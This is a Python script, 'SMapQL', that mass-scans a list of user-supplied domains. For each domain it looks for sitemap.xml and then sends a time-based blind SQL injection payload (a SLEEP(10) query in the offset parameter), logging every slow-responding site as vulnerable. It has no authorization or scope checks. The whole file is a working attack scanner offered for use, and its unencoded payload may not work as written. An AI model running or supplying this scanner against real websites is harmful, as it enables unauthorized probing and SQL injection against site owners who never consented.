import requests
import argparse
import logging
import threading
from bs4 import BeautifulSoup
from tqdm import tqdm
from concurrent.futures import ThreadPoolExecutor, as_completed

# Set up logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

class SitemapSQLiTool:
    def __init__(self, target_domains):
        self.target_domains = target_domains
        self.sitemap_subdomains = []
        self.vulnerable_domains = []

    def find_sitemaps(self, domain):
        try:
            response = requests.get(f"https://{domain}/sitemap.xml")
            if response.status_code == 200:
                self.sitemap_subdomains.append(domain)
                logging.info(f"Found sitemap at {domain}")
        except requests.exceptions.RequestException as e:
            logging.error(f"An error occurred while checking {domain}: {e}")

    def test_sqli(self, domain):
        try:
            response = requests.get(f"https://{domain}/sitemap.xml?offset=1;SELECT IF((8303>8302),SLEEP(10),2356)#", timeout=20)
            if response.elapsed.total_seconds() > 10:
                self.vulnerable_domains.append(domain)
                logging.info(f"Potential vulnerability found at {domain}")
        except requests.exceptions.RequestException as e:
            logging.error(f"An error occurred while testing {domain}: {e}")

    def report(self):
        with open("vulnerable_domains.txt", "w") as f:
            for domain in self.vulnerable_domains:
                f.write(f"{domain}\n")
        logging.info("Vulnerabilities reported.")

def main():
    parser = argparse.ArgumentParser(description='SMapQL - Sitemap SQLi tool')
    parser.add_argument('-d', '--domains', help='List of domains to test', required=True, nargs='+')
    args = parser.parse_args()

    tool = SitemapSQLiTool(args.domains)

    print("Finding sitemaps...")
    with ThreadPoolExecutor(max_workers=10) as executor:
        futures = {executor.submit(tool.find_sitemaps, domain) for domain in tqdm(args.domains)}
        for future in as_completed(futures):
            pass

    print("Testing for SQLi...")
    with ThreadPoolExecutor(max_workers=10) as executor:
        futures = {executor.submit(tool.test_sqli, domain) for domain in tqdm(tool.sitemap_subdomains)}
        for future in as_completed(futures):
            pass

    tool.report()

if __name__ == "__main__":
    main()
